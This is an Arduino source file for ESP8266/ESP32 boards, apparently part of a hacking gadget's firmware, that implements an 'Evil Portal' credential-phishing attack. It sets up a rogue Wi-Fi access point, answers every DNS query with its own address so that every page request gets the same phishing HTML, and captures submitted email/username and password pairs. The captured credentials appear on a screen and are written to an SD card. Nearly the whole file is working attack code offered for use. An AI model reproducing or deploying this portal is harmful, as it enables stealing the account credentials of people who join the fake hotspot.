//Author Programmer Developer Ruvic101@gmail.com
//Donation https://www.paypal.me/ruvics/10usd
#ifdef ESP8266
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
ESP8266WebServer webServer(80);
#else
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
WebServer webServer(80);
#endif

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
String responseHTML;
char email_evil[32] = "";
char password_evil[32] = "";


void handleSave() {
  Serial.println("wifi save");
  email_evil[0] = '\0';
  password_evil[0] = '\0';
  webServer.arg("email").toCharArray(email_evil, sizeof(email_evil) - 1);
  webServer.arg("password").toCharArray(password_evil, sizeof(password_evil) - 1);
  webServer.sendHeader("Location", "wifi", true);
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");
  webServer.send(302, "text/plain", "");  // Empty content inhibits Content-length header so we have to close the socket ourselves.
  webServer.client().stop();
  display.clearBuffer();
  display.drawStr(25, 15, "Evil Portal");
  if (email_evil[0] != '\0' && password_evil[0] != '\0') {
    Serial.println(String(email_evil));
    Serial.println(String(password_evil));

    display.drawStr(25, 30, email_evil);
    display.drawStr(25, 38, password_evil);
    display.sendBuffer();
    open_file(SD, "evp", "html");
    String EmPas;
    EmPas = fileo + " email/username :" + String(email_evil) + " Pass :" + String(password_evil);
    save_file(SD, (String)EmPas);
    display.drawStr(25, 46, "Save");
  }
  display.sendBuffer();
}


void evil_portal_init() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  //WiFi.softAP("DNSServer CaptivePortal example");
  WiFi.softAP(dns_evil_portal);
  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  // replay to all requests with same HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
    webServer.begin();///esp32s2S
    Serial.println("onNotFound");
  });

  //    webServer.on("/", HTTP_ANY, []() {
  //   webServer.send(200, "text/html", responseHTML);
  //    Serial.println("Served Basic HTML Page");
  //  });


  webServer.on("/get", handleSave);
  webServer.begin();
  display.clearBuffer();  // clear the internal memory  u8g2.setFont(u8g_font_7x14);
  display.drawStr(25, 15, "Evil Portal");

  display.setCursor(25, 25);
  display.print(WiFi.softAPIP());





  display.sendBuffer();  // transfer internal memory to the display
}

void evil_portal_start() {
  responseHTML = html_content;
  evil_portal_init();
  bool exit_ep = 1;
  while (exit_ep) {
    if (readButtonStateY(BTN_Y)) {
      //      preferences.putBool("run_evilportal", 0);
      //      preferences.putInt("html", 0);
      exit_ep = 0;
      //    preferences.end();

      //ESP.restart();
    }
    dnsServer.processNextRequest();
    webServer.handleClient();
  }
  webServer.stop();
  dnsServer.stop();
}
